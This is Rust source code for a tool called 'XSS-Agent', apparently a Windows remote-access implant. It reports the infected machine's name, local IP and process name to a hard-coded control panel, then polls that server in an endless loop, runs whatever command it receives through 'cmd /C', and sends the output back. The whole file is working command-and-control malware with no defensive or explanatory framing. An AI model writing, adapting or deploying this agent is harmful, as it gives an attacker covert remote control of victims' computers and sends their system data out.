/*
 * XSS-Agent tool
 * Developed by Mr_Stuxnot
 *
*/

use std::env;
use std::net::TcpStream;
use reqwest::blocking::Client;
use std::process::Command;
use std::str;
use std::thread;
use std::time::Duration;

const BASE_URL: &str = "http://10.0.0.202/panel/xss_agent/endpoint/";

fn register() -> Result<(), Box<dyn std::error::Error>> {
    let computer_name = env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());
    let ip = TcpStream::connect("1.1.1.1:80")?.local_addr()?.ip().to_string();
    let process_name = env::current_exe()?.file_name().unwrap().to_string_lossy().into_owned();

    let client = Client::new();
    let url = format!("{}{}", BASE_URL, "v1.php");

    let params = [
        ("name", computer_name),
        ("ip_address", ip),
        ("process_name", process_name),
    ];

    let response = client.post(&url)
        .form(&params)
        .send()?;

    println!("Response: {:?}", response.text()?);
    Ok(())
}

fn execute_commands() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let commands_url = format!("{}{}", BASE_URL, "commands.php");
    let results_url = format!("{}{}", BASE_URL, "results.php"); 
    let computer_name = env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());

    loop {
        let params = [
            ("name", computer_name.clone()),
        ];

        let response = client.post(&commands_url)
            .form(&params)
            .send()?;

        let command = response.text()?;

        if !command.is_empty() {
            let output = Command::new("cmd")
                .arg("/C")
                .arg(&command)
                .output()?;

            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();

            println!("stdout: {}", stdout);
            
            let params = [
                ("command", command),
                ("output", stdout),
                ("error", stderr),
                ("name", computer_name.clone()),
            ];

            // Send results to the results endpoint
            let results_response = client.post(&results_url)
                .form(&params)
                .send()?;

            println!("Results Response: {:?}", results_response.text()?);

            // Sleep for 1 second
            thread::sleep(Duration::from_secs(1));
        }
    }
}

fn main() {
    if let Err(e) = register() {
        eprintln!("Error: {:?}", e);
    }

    if let Err(e) = execute_commands() {
        eprintln!("Error: {:?}", e);
    }
}